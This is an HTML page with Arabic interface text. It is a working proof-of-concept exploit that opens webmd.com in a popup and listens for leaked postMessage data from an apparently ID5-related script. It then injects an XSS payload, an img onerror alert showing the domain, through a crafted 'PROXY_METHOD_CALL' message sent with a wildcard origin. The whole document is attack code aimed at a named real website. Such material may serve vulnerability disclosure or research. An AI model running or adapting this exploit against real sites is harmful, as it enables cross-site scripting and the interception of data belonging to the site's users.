<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>هجوم Popup - استغلال postMessage</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #222; color: #fff; padding: 50px; text-align: center; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #ff4444; color: white; border: none; border-radius: 5px; }
        .log-container { margin-top: 30px; background: #000; padding: 20px; text-align: left; border: 1px solid #444; overflow-y: auto; max-height: 300px; }
        .success { color: #00ff00; }
    </style>
</head>
<body>
    <h1>اختبار ثغرة postMessage (Popup Mode)</h1>
    <p>بسبب قيود المتصفح، يجب الضغط على الزر لفتح النافذة وبدء الهجوم:</p>
    
    <button onclick="startExploit()">بدء الهجوم الآن</button>

    <div class="log-container" id="log">في انتظار بدء الهجوم...</div>

    <script>
        let victimWindow;

        function log(message, isSuccess = false) {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = isSuccess ? 'success' : '';
            entry.innerText = `[${new Date().toLocaleTimeString()}] ${message}`;
            logDiv.appendChild(entry);
        }

        function startExploit() {
            log("جاري فتح نافذة الضحية...");
            
            // 1. فتح موقع الضحية في نافذة جديدة
            victimWindow = window.open("https://www.webmd.com", "VictimSite");

            if (!victimWindow) {
                log("خطأ: تم حظر النافذة المنبثقة! يرجى السماح بالبث المنبثق.");
                return;
            }

            // 2. سماع البيانات المسربة (Exfiltration)
            // بما أن الموقع المصاب يبث الرسائل لكل الـ Openers، سنستلمها هنا
            window.addEventListener("message", (event) => {
                if (event.data && event.data._isId5Message) {
                    log("!!! تم اعتراض بيانات مسربة: " + JSON.stringify(event.data), true);
                    console.log("Leaked Data:", event.data);
                }
            });

            // 3. محاولة حقن الـ XSS بعد مهلة كافية للتحميل
            log("الانتظار 5 ثوانٍ لتحميل سكربتات الضحية...");
            setTimeout(() => {
                log("إرسال Payload الـ XSS...");
                
                const payload = {
                    _isId5Message: true,
                    src: "attacker-id",
                    type: "PROXY_METHOD_CALL", // النوع المستهدف في الكود المصاب
                    payload: {
                        name: "test",
                        args: ["<img src=x onerror=\"alert('XSS عبر Popup!\\nDomain: ' + document.domain);\">"]
                    }
                };

                // إرسال الرسالة إلى النافذة المفتوحة باستخدام "*"
                victimWindow.postMessage(payload, "*");
                log("تم إرسال الـ Payload.");
            }, 5000);
        }
    </script>
</body>
</html>
